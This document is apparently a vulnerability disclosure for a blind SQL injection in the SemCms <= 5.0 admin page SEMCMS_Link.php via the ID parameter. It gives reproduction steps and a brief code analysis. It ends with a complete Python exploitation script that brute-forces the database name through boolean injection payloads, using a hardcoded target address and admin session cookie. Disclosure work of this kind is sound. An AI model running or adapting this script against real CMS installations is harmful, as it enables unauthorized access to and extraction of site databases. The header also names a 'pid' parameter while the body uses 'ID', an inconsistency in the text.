# SemCms <= 5.0 has a SQL Injection Vulnerability
##### Vulnerability Location: SEMCMS_Link.php
##### Affected Range: SemCms <= 5.0
##### Vulnerability Cause: SemCms <= v5.0 was discovered to contain a SQL injection vulnerability.This allows an attacker to execute arbitrary code via the pid parameter in the SEMCMS_Link.php component.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions.
##### Link:https://www.sem-cms.com/

# Vulnerability recurrence

After entering the background.There is an SQL injection vulnerability in the ID parameter. Construct URL links. http://localhost:83/admin/SEMCMS_Link.php?type=edit&ID=1
It was found that when ID=1, there is a corresponding content ~

![image](https://github.com/user-attachments/assets/af84336d-ed4d-4244-8a49-83061a20b2ea)

When ID=1-1, there is no corresponding content:

![image](https://github.com/user-attachments/assets/c8813265-cbc2-4087-88d6-d8c2f0015aaa)

Determine the length of the database:

![image](https://github.com/user-attachments/assets/e8e98be9-1c5f-41cc-b0ad-36ae9d95607e)
![image](https://github.com/user-attachments/assets/9a8b1cf3-dfc0-4416-b83d-0e1a852bb8d5)

The normal echo indicates that the length of the database name is 8. Next, determine what the specific value of the database name is?

![image](https://github.com/user-attachments/assets/119820f0-ded4-4335-8f66-29354f73c695)

Finally, the database username is obtained as semcms50, and the yakit data packet:

# Code Analysis
Line 32 of `SEMCMS_Link.php`

![image](https://github.com/user-attachments/assets/63d5b5ca-6cac-4ee0-8f51-0b2a9bbc19bf)

The ID parameters were directly concatenated into the SQL statement, thereby causing an SQL injection vulnerability

# Vulnerability exploitation script

```
import requests
import string
import time
from urllib.parse import parse_qs, urlencode
# 需要通过页面的回显来修改判断的条件
# 需要后台路径
# 需要更新Cookie

# 发送请求
def send_request(url, headers):
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=10,
            verify=False
        )

        return response
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# 爆破数据库名长度
def database_length():
    print("[*] 开始爆破数据库名长度...")
    for i in range(1,20):
        base_url = url + f'if(length(database())>{i},999,1)'
        resp = send_request(base_url,header).text
        if 'semcms' in resp:
            print("数据库名长度为：" + str(i))
            return i 
            

# 爆破数据库名
def exploit_sql_injection(url, header, db_len):
    
    
    db_name = ""
    
    max_length = 32  # 假设数据库名最大长度
    
    # 字符集：小写字母、数字、常见符号
    charset = string.ascii_lowercase + string.digits + "-$@! "
    

    print("[*] 开始爆破数据库名...")

    for i in range(1,db_len+1):
        for j in charset:
            base_url = url + f'if(substr(database(),{i},1) like "{j}",1,999)'
            resp = send_request(base_url, header).text
            if 'semcms' in resp:
                db_name += str(j)
                print(f"[+] 第{i}个位置的字符: '{j}' 匹配成功, 当前: {db_name}")
                break

    
    print(f"[*] 爆破完成! 数据库名: {db_name}")
    return db_name

if __name__ == "__main__":
    url = f"http://192.168.124.6:81/VvK4qw_Admin/SEMCMS_Link.php?type=edit&ID="
    
    db_len = 0

    header = {
        "Cookie":"scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b"
    }

    db_len = database_length()

    if(db_len != 0):
        exploit_sql_injection(url, header,db_len)
    

```
